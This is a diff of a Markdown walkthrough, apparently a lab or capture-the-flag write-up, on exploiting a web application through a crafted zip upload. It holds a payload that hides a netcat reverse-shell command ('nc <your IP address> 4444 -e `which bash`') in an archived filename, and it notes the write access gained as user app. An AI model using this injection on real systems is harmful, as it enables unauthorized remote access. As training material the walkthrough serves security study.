@@ -54,7 +54,7 @@ zip joergen.zip joergen.jpg
 ```
 Modify the contained filename to one with the shell command for the reverse shell (filename needs to end with an image extention as the application checks for that):
 ```
-printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;'.jpg\n" | zipnote -w joergen.zip
+printf "@ joergen.jpg\n@=';nc <your IP address> 4444 -e \`which bash\`;'.jpg\n" | zipnote -w joergen.zip
 ```
 
 **Option 2**
@@ -77,11 +77,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjEyNTU5OTAzNiwxNDQwMDk3MDgzLC05Mz
-U4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNywtMTc2MzU0
-MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5MzcyMDQzOS
-wxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOTc0MTEsLTU3
-NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0zOTg0OTE0Nj
-EsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4NywtMTQ2
-NzYxNTI2Ml19
+eyJoaXN0b3J5IjpbLTE5MjY4MTc5MjQsMjEyNTU5OTAzNiwxND
+QwMDk3MDgzLC05MzU4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2
+MzYxNywtMTc2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4Nj
+EsMTI5MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02
+MTkyOTc0MTEsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0ND
+M1LC0zOTg0OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkz
+MzM2MTc4N119
 -->
